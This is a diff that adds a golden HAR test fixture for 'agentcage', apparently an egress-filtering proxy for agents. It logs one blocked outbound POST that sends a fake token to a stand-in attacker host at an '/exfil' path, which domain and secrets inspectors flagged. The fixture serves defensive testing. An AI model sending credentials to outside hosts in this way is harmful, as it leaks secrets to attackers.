@@ -1,0 +1,59 @@
+{
+  "log": {
+    "creator": {
+      "name": "agentcage",
+      "version": "0.0.0-golden"
+    },
+    "entries": [
+      {
+        "cache": {},
+        "comment": "{\"flow_id\": \"flow-0003\", \"direction\": \"outbound\", \"decision\": \"blocked\", \"inspectors\": [{\"name\": \"domain\", \"severity\": \"error\", \"reason\": \"not in allowlist\"}, {\"name\": \"secrets\", \"severity\": \"critical\", \"reason\": \"credential in body\"}], \"view\": \"outbound\"}",
+        "request": {
+          "bodySize": 27,
+          "cookies": [],
+          "headers": [
+            {
+              "name": "Host",
+              "value": "evil.example.org"
+            },
+            {
+              "name": "Content-Type",
+              "value": "application/x-www-form-urlencoded"
+            }
+          ],
+          "headersSize": -1,
+          "httpVersion": "HTTP/1.1",
+          "method": "POST",
+          "postData": {
+            "mimeType": "application/x-www-form-urlencoded",
+            "text": "token=FAKE-NOT-A-REAL-TOKEN"
+          },
+          "queryString": [],
+          "url": "https://evil.example.org/exfil"
+        },
+        "response": {
+          "bodySize": -1,
+          "content": {
+            "mimeType": "",
+            "size": 0
+          },
+          "cookies": [],
+          "headers": [],
+          "headersSize": -1,
+          "httpVersion": "HTTP/1.1",
+          "redirectURL": "",
+          "status": 0,
+          "statusText": ""
+        },
+        "startedDateTime": "2024-01-01T00:02:00+00:00",
+        "time": 0,
+        "timings": {
+          "receive": -1,
+          "send": -1,
+          "wait": -1
+        }
+      }
+    ],
+    "version": "1.2"
+  }
+}
